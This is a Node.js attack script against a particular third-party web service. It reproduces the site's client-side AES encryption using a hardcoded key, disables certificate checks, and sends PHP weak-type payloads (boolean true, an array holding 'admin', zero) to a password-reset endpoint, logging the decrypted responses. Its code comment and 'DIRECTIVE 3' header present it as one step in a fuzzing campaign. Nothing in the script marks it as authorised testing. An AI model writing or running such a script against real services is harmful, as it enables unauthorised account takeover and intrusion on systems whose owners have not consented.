const CryptoJS = require('crypto-js');
const https = require('https');

const HOST = 'ebb56293.com';
const PORT = 9900;
const PATH = '/entrance/api';

const keyHash = CryptoJS.MD5('ZXNicGx1cw==').toString();
const key = CryptoJS.enc.Utf8.parse(keyHash);

function encryptApiData(jsonObj) {
    let jsonStr = typeof jsonObj === 'string' ? jsonObj : JSON.stringify(jsonObj);
    let encrypted = CryptoJS.AES.encrypt(jsonStr, key, { mode: CryptoJS.mode.ECB });
    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(encrypted.toString()));
}

function decryptApiData(b64Data) {
    try {
        let dec = CryptoJS.AES.decrypt(CryptoJS.enc.Utf8.stringify(CryptoJS.enc.Base64.parse(b64Data)), key, { mode: CryptoJS.mode.ECB });
        return dec.toString(CryptoJS.enc.Utf8);
    } catch (e) {
        return "ERR";
    }
}

function sendProbe(name, paramsObj) {
    return new Promise((resolve) => {
        // params MUST be a stringified object, not the object itself, to bypass the "array given" PHP error we saw before.
        const payload = { url: '/infe/user/pwdforget/process.json', params: JSON.stringify(paramsObj) };
        const postData = 'requestData=' + encodeURIComponent(encryptApiData(payload));

        const req = https.request({
            hostname: HOST, port: PORT, path: PATH, method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Origin': `https://${HOST}:${PORT}`,
                'Referer': `https://${HOST}:${PORT}/web/`,
                'X-Requested-With': 'XMLHttpRequest'
            },
            rejectUnauthorized: false
        }, (res) => {
            let data = '';
            res.on('data', d => data += d);
            res.on('end', () => {
                console.log(`\n================================`);
                console.log(`[+] Fuzzing Payload: ${name}`);
                console.log(`[>] SNT: ${JSON.stringify(paramsObj)}`);
                console.log(`[<] HTTP: ${res.statusCode}`);
                console.log(`[<] RSP: ${decryptApiData(data)}`);
                resolve();
            });
        });

        req.on('error', e => resolve());
        req.write(postData);
        req.end();
    });
}

async function run() {
    console.log("🚀 [DIRECTIVE 3: PHP WEAK TYPE FUZZING] INITIATING...");
    await sendProbe("1. Boolean bypass (account: true)", { account: true, step: 1 });
    await sendProbe("2. Array injection (account: ['admin'])", { account: ["admin"], step: "1" });
    await sendProbe("3. Zero-value comparison (account: 0)", { account: 0, step: "1" });
    console.log("\n✅ [DIRECTIVE 3 COMPLETE]");
}
run();
